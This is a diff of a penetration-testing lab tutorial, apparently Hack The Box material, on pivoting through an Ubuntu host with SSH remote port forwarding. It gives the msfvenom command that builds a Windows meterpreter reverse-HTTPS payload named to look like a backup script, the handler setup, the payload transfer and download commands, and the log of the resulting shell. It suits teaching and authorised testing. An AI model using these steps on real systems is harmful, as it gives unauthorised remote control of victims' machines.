@@ -16,8 +16,7 @@ In these cases, we would have to find a pivot host, which is a common connection
 
 #### Creating a Windows Payload with msfvenom
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -30,8 +29,7 @@ Saved as: backupscript.exe
 
 #### Configuring & Starting the multi/handler
 
-```
-        shellsession
+```shellsession
 msf6 > use exploit/multi/handler
 
 [*] Using configured payload generic/shell_reverse_tcp
@@ -50,8 +48,7 @@ Once our payload is created and we have our listener configured & running, we ca
 
 #### Transferring Payload to Pivot Host
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
 
 backupscript.exe                                   100% 7168    65.4KB/s   00:00
@@ -61,8 +58,7 @@ After copying the payload, we will start a `python3 HTTP server` using the below
 
 #### Starting Python3 Webserver on Pivot Host
 
-```
-        shellsession
+```shellsession
 ubuntu@Webserver$ python3 -m http.server 8123
 ```
 
@@ -70,8 +66,7 @@ ubuntu@Webserver$ python3 -m http.server 8123
 
 We can download this `backupscript.exe` on the Windows host via a web browser or the PowerShell cmdlet `Invoke-WebRequest`.
 
-```
-        powershell
+```powershell
 PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
 
@@ -79,8 +74,7 @@ Once we have our payload downloaded on the Windows host, we will use `SSH remote
 
 #### Using SSH -R
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
 ```
 
@@ -88,8 +82,7 @@ After creating the SSH remote port forward, we can execute the payload from the 
 
 #### Viewing the Logs from the Pivot
 
-```
-        shellsession
+```shellsession
 ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
 debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
 debug1: channel 1: new [172.16.5.19]
@@ -109,8 +102,7 @@ If all is set up properly, we will receive a Meterpreter shell pivoted via the U
 
 #### Meterpreter Session Established
 
-```
-        shellsession
+```shellsession
 [*] Started HTTPS reverse handler on https://0.0.0.0:8000
 [!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
 [*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
